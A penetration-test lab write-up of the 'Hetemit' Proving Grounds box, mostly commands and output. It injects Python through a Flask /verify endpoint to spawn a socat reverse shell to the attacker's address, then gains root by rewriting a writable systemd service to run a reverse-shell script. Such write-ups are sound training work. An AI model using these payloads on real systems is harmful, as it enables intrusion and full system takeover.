---
layout: default
title: x008-Hetemit
nav_order: 2
has_children: false
parent: ProvingGrounds
grand_parent: Writeups
---

## x008-Hetemit

### Abstract

Linux Box

### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.



| Server IP Adress | Ports Open |
|------------------|------------|
|     192.168.147.117      | TCP : 21, 22, 80, 139, 445, 18000, 50000,    |
|                  | UDP :      |



**Nmap Scan Results:**

Using  :
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV 192.168.147.117
```

Result :
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 18:30 CEST
Nmap scan report for 192.168.147.117
Host is up (0.030s latency).
Not shown: 65517 filtered tcp ports (no-response), 11 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.147
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.92%I=7%D=5/17%Time=6283CDE0%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-17T16:31:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.39 seconds

```

**Vulnerability Exploited:**

Python Exposed Feature allowing code execution

**Vulnerability Explanation:**

Using the end point to verify the code we are able to perform code execution : 

```bash
kali@kali:~$ curl -X POST --data "code=2*2" http://192.168.147.117:50000/verify
4
```

Using this we are able to craft a Python payload in order to receive our reverse shell :
```bash
kali@kali:~$ curl -X POST --data "code=os.system('socat TCP:192.168.49.147:18000 EXEC:sh')" http://192.168.147.117:50000/verify
```

We could upgrade our shell to a interactive one : 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](attachments/Pasted%20image%2020220517191513.png)


**Vulnerability Fix:**

Properly control user input in order to avoid escalation to reverse shell

**Severity:** Critical

**Proof of Concept / Code Here:**


```bash
curl -X POST --data "code=os.system('socat TCP:192.168.49.147:18000 EXEC:sh')" http://192.168.147.117:50000/verify
```


**Local.txt Proof Screenshot**

![](attachments/Pasted%20image%2020220517191537.png)

**Local.txt Contents**

`c0a0045cc9ee57312ed5d03931b571db`

### Privilege Escalation

**Vulnerability Exploited:**

Wrong Permission For Service File

**Vulnerability Explanation:**

From our user we could note that we are able to run the following command as sudo : 

![](attachments/Pasted%20image%2020220517191831.png)

As we enumerate the system, we'll search for writeable configuration files.

```bash
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2> /dev/null
find /etc -type f -writable 2> /dev/null
/etc/systemd/system/pythonapp.service
```

According to this, we can write to **pythonapp.service**, which appears to be some kind of system service. 

Let's check the contents of **pythonapp.service**.

```bash
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Perfect. We can modify this file to escalate to root. We'll modify this file to run a reverse shell, then restart the system. Once the system restarts, our shell should run as a system service. Let's modify **pythonapp.service**.

```bash
[cmeeks@hetemit ~]$ cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT
```

Specifically, we modified the `ExecStart` and `User` lines, and removed the `WorkingDirectory=` line.

Next, we'll create the reverse shell file.

```bash
[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.49.147:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
```

Let's restart our listener on port 18000, and then reboot the machine.

```bash
[cmeeks@hetemit ~]$ sudo reboot
```

When the machine boots up, we obtain a root shell.

![](attachments/Pasted%20image%2020220517192230.png)


**Vulnerability Fix:**

Restrict permission on the service definition file
 
**Severity:** High

**Proof of Concept / Code Here:**

Service : 
```bash
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Shell script : 

```sh
#!/bin/bash
socat TCP:192.168.49.147:18000 EXEC:sh
```

**Proof Screenshot Here:**

![](attachments/Pasted%20image%2020220517192721.png)

**Proof.txt Contents:**


`335f9e5e62866c9e4b353b68e07c93c0`

--------

### NOTES : 
#### Web Enumeration

After some basic enumeration, we discover that the application running on port 18000 presents a standard web page.

```bash
kali@kali:~$ curl http://192.168.120.36:18000/ 
<!DOCTYPE HTML>
<html>
	<head>
		<title>Eventually by HTML5 UP</title>
...
	</head>
	<body class="is-preload">
    <!-- Header -->
    <header id="header">
        <h1>Protomba</h1>
        <p>Making the world a better place</p>
    </header>

    <p>Protomba is more than just a random Idea. 
Blockchain, Shopping and Community are just a few characteristic of Protomba. But we offer a lot more!</p>

<p>Want to join us? Please <a href="/users/new">register</a> today for a new account, or  <a href="/login">login</a> if you are already part of the team.</p>
...
		<!-- Scripts -->
    <script src="/packs/js/application-3cb580aa33ebf70324a3.js" data-turbolinks-track="reload"></script>

	</body>
</html>
```

The application on port 50000 seems to host an API used to generate invite codes.

```bash
kali@kali:~$ curl http://192.168.120.36:50000/
{'/generate', '/verify'}

kali@kali:~$ curl http://192.168.120.36:50000/generate
{'email@domain'}

kali@kali:~$ curl http://192.168.120.36:50000/verify
{'code'}
```

The application running on port 18000 requires an invite code to allow registration of an account.

To generate an invite code, we need to send a `POST /generate` request to the application running on port 50000. From the earlier response, we know that we need to include an email address.

```bash
kali@kali:~$ curl -X POST --data "email=test@testing" http://192.168.120.36:50000/generate
5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e
```

With this invite code, we can now register to the main application. However, this seems to be a dead end, since it doesn't seem like we can manipulate the application after we finally log in.

If we continue our enumeration on port 50000, we discover that the `verify` endpoint exhibits odd behavior:

```bash
kali@kali:~$ curl -X POST --data "code=code" http://192.168.120.36:50000/verify
code
```

```bash
kali@kali:~$ curl -X POST --data "code=5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e" http://192.168.120.36:50000/verify 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

```bash
kali@kali:~$  curl -X POST --data "code=2+2" http://192.168.120.36:50000/verify
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

It seems that the `verify` option doesn't actually verify the code. In addition, the application performs evaluation:

```bash
kali@kali:~$ curl -X POST --data "code=2*2" http://192.168.120.36:50000/verify
4
```

### Exploitation

Knowing that this server is running `Python/3.6.8` (thanks to our `nmap` output), let's attempt to use the highly dangerous `os` module.

```bash
kali@kali:~$ curl -X POST --data "code=os" http://192.168.120.36:50000/verify
<module 'os' from '/usr/lib64/python3.6/os.py'>
```

The existence of this module all but guarantees we can get a shell. Let's set up a listener.

```bash
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
```

Next, we'll create a reverse shell connection.

```bash
kali@kali:~$ curl -X POST --data "code=os.system('socat TCP:192.168.118.8:18000 EXEC:sh')" http://192.168.120.36:50000/verify
```

Nice! We caught a reverse shell.

```bash
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 44872
python3 -c 'import pty; pty.spawn("/bin/bash")'

[cmeeks@hetemit restjson_hetemit]$ whoami
cmeeks
```

### Escalation

#### Enumeration

As we enumerate the system, we'll search for writeable configuration files.

```bash
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2> /dev/null
find /etc -type f -writable 2> /dev/null
/etc/systemd/system/pythonapp.service
```

According to this, we can write to **pythonapp.service**, which appears to be some kind of system service. Next, we'll check our sudo permissions.

```bash
[cmeeks@hetemit ~]$ sudo -l    
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

This indicates that we can reboot and shutdown the computer.

#### Incorrect File Permissions

Let's check the contents of **pythonapp.service**.

```bash
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Perfect. We can modify this file to escalate to root. We'll modify this file to run a reverse shell, then restart the system. Once the system restarts, our shell should run as a system service. Let's modify **pythonapp.service**.

```bash
[cmeeks@hetemit ~]$ cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT
```

Specifically, we modified the `ExecStart` and `User` lines, and removed the `WorkingDirectory=` line.

Next, we'll create the reverse shell file.

```bash
[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
```

Let's restart our listener on port 18000, and then reboot the machine.

```bash
[cmeeks@hetemit ~]$ sudo reboot
```

When the machine boots up, we obtain a root shell.

```bash
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 57890
python3 -c 'import pty; pty.spawn("/bin/bash")'

[root@hetemit /]# whoami
root

[root@hetemit /]# 
```